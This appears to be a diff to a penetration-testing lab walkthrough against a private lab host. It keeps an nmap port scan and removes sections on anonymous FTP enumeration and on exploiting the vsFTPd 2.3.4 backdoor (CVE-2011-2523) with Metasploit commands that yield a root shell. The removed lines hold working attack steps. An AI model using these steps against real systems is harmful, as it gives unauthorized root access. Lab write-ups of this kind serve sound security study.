@@ -16,7 +16,7 @@ This walkthrough documents the enumeration and exploitation of services found ru
 ## 1. Initial Port Scan
 
 Command:
-```bash
+bash
 nmap -sS -p- 10.0.2.5
 
 Output summary:
@@ -44,54 +44,5 @@ Open Ports:
 8180/tcp   - Unknown HTTP
 8787/tcp   - msgsrvr
 45156+     - Unknown high ports
-
-
-2. FTP Enumeration (Port 21)
-Command:
-ftp 10.0.2.5
-
-Result:
-Logged in using:
-
-Username: anonymous
-
-Password: (blank)
-
-FTP Server: vsFTPd 2.3.4
-
-File Upload Attempt:
-echo "test upload from katakambing" > test.txt
-ftp 10.0.2.5
-put test.txt
-
-Response:
-553 Could not create file.
-
-Conclusion:
-
-Anonymous login is enabled
-No writable directories found
-FTP access is read-only
-
-3. Exploiting vsFTPd 2.3.4 Backdoor (CVE-2011-2523)
-The FTP server is running a known vulnerable version: vsFTPd 2.3.4
-
-Exploit used:
-msfconsole
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOSTS 10.0.2.5
-run
-
-result:
-[*] Backdoor service has been spawned.
-[*] Command shell session opened.
-
-Post-Exploitation - Root Shell Access
-Proof of Access:
-whoami
-# root
-
-ls /
-# bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  sbin  tmp  usr  var
 
 
